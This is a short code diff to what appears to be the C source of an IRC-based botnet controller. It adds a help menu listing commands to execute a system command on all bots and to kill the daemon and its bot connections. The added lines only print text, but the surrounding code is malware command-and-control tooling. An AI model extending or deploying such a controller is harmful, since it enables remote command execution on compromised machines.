@@ -160,6 +160,14 @@ void cli_read(int cli_sockfd) {
                         exit(EXIT_SUCCESS);
                     }
 
+                    /* help, display supported commands */
+                    else if (strcmp(cmd, "help") == 0) {
+                        
+                        cli_write(cli_sockfd, ".help - display supported commands\n");
+                        cli_write(cli_sockfd, ".cmd [CMD] - execute CMD on all bots\n");
+                        cli_write(cli_sockfd, ".exit - kill ircss daemon and all bot connections\n");
+                    }
+
                     /* cmd, a system command to be executed on all bots */
                     else if (strcmp(cmd, "cmd") == 0) {
                         tok = strtok(NULL, "\r\n");
